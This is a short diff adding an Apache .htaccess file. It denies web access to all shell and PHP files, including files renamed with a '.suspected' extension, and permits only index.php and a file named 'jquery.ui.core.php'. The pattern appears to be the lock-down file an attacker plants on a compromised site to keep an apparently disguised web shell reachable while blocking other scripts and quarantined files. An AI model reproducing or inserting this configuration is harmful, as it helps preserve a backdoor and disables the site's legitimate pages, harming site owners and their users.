@@ -1,0 +1,8 @@
+<FilesMatch ".*\.(sh|Sh|shtml|phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|jquery.ui.core.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
